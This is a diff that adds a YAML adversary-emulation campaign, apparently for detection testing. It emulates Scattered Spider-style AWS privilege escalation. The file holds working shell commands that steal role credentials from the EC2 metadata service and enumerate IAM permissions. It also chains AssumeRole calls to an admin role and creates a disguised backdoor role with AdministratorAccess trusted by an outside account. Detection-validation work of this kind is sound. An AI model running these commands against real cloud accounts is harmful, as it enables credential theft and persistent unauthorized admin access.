@@ -1,0 +1,105 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: cloud-privilege-escalation
+  adversary: scattered-spider
+  description: "Cloud privilege escalation — exploit IAM misconfigurations, assume-role chaining, and metadata service abuse to escalate from minimal permissions to admin across AWS/GCP/Azure."
+  objective: "Validate detection of cloud privilege escalation paths including role chaining, metadata credential theft, and cross-account pivots."
+  mitre_version: "15.1"
+  severity: critical
+  tags: [cloud, privilege-escalation, iam, aws, metadata-service]
+  authors: ["ThreatEcho"]
+  created: "2025-03-15"
+  modified: "2025-09-08"
+
+variables:
+  metadata_endpoint: "http://169.254.169.254"
+  target_role: "arn:aws:iam::123456789012:role/admin-role"
+  region: "us-east-1"
+
+stages:
+  - id: imds-credential-theft
+    name: IMDS Credential Theft
+    technique: T1552.005
+    tactic: credential-access
+    description: "Query the EC2 instance metadata service to steal temporary IAM credentials attached to the instance role."
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          TOKEN=$(curl -s -X PUT "{{metadata_endpoint}}/latest/api/token" \
+            -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+          ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+            "{{metadata_endpoint}}/latest/meta-data/iam/security-credentials/")
+          curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+            "{{metadata_endpoint}}/latest/meta-data/iam/security-credentials/$ROLE"
+    expect:
+      telemetry: [network_connection, cloud_trail_event]
+      detections: [imds_credential_access, metadata_service_query, ec2_role_credential_theft]
+    on_failure: continue
+
+  - id: iam-policy-enumeration
+    name: IAM Policy Enumeration
+    technique: T1087.004
+    tactic: discovery
+    description: "Enumerate IAM permissions to discover privilege escalation paths via policy misconfigurations."
+    depends_on: [imds-credential-theft]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2) --region {{region}}
+          aws iam list-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2) --region {{region}}
+          aws iam simulate-principal-policy --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \
+            --action-names "iam:CreateRole" "iam:AttachRolePolicy" "sts:AssumeRole" "lambda:CreateFunction" --region {{region}}
+    expect:
+      telemetry: [cloud_trail_event, api_call]
+      detections: [iam_enumeration, privilege_path_discovery, permission_boundary_probing]
+    on_failure: continue
+
+  - id: assume-role-chain
+    name: Assume-Role Chain Escalation
+    technique: T1548
+    tactic: privilege-escalation
+    description: "Chain multiple AssumeRole calls to escalate from a low-privilege role to admin through transitive trust."
+    depends_on: [iam-policy-enumeration]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          CREDS1=$(aws sts assume-role --role-arn arn:aws:iam::123456789012:role/deploy-role \
+            --role-session-name escalate1 --region {{region}})
+          export AWS_ACCESS_KEY_ID=$(echo $CREDS1 | jq -r .Credentials.AccessKeyId)
+          export AWS_SECRET_ACCESS_KEY=$(echo $CREDS1 | jq -r .Credentials.SecretAccessKey)
+          export AWS_SESSION_TOKEN=$(echo $CREDS1 | jq -r .Credentials.SessionToken)
+          aws sts assume-role --role-arn {{target_role}} --role-session-name escalate2 --region {{region}}
+    expect:
+      telemetry: [cloud_trail_event, sts_event]
+      detections: [role_chain_escalation, transitive_trust_abuse, cross_account_assume_role]
+    on_failure: continue
+
+  - id: persistence-backdoor-role
+    name: Create Backdoor IAM Role
+    technique: T1098.001
+    tactic: persistence
+    description: "Create a new IAM role with admin permissions and an external trust policy for persistent access."
+    depends_on: [assume-role-chain]
+    execute:
+      type: shell
+      target: localhost
+      args:
+        command: |
+          aws iam create-role --role-name support-diagnostic \
+            --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::999999999999:root"},"Action":"sts:AssumeRole"}]}' \
+            --region {{region}}
+          aws iam attach-role-policy --role-name support-diagnostic \
+            --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --region {{region}}
+    expect:
+      outcome: blocked
+      telemetry: [cloud_trail_event, iam_event]
+      detections: [backdoor_role_creation, external_trust_policy, admin_policy_attachment]
+    on_failure: abort
